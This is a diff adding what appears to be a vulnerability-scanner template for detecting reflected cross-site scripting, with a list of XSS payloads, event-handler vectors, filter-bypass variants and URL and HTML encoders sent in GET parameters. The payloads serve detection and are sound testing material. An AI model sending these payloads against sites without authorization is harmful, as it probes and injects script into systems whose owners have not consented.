@@ -1,0 +1,78 @@
+# templates/xss/reflected-xss-advanced.yaml
+id: reflected-xss-advanced
+info:
+  name: Advanced Reflected Cross-Site Scripting Detection
+  author: webx-elite
+  severity: high
+  description: Comprehensive reflected XSS detection using multiple payload variations and context-aware testing
+  tags:
+    - xss
+    - reflected
+    - injection
+    - owasp-top10
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+
+vulnerability_type: xss
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{xss_payload}}"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert("
+          - "javascript:alert("
+          - "onload=alert("
+          - "onerror=alert("
+          - "<img src=x onerror="
+        condition: or
+      
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+        condition: and
+      
+      - type: status
+        status:
+          - 200
+
+payloads:
+  # Basic script injection
+  - "<script>alert('XSS')</script>"
+  - "<script>alert(document.domain)</script>"
+  - "<script>confirm('XSS')</script>"
+  
+  # Event handler injection
+  - "\"><script>alert('XSS')</script>"
+  - "'><script>alert('XSS')</script>"
+  - "\"><img src=x onerror=alert('XSS')>"
+  - "'><img src=x onerror=alert('XSS')>"
+  
+  # JavaScript protocol
+  - "javascript:alert('XSS')"
+  - "JAVASCRIPT:alert('XSS')"
+  - "JaVaScRiPt:alert('XSS')"
+  
+  # HTML5 vectors
+  - "<svg onload=alert('XSS')>"
+  - "<iframe srcdoc=\"<script>alert('XSS')</script>\">"
+  - "<details open ontoggle=alert('XSS')>"
+  - "<marquee onstart=alert('XSS')>"
+  
+  # Filter bypass techniques
+  - "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+  - "<ScRiPt>alert('XSS')</ScRiPt>"
+  - "<script>alert(String.fromCharCode(88,83,83))</script>"
+  - "<script>eval('alert(\\'XSS\\')')</script>"
+
+encoders:
+  - url
+  - html_encode
+  - double_url
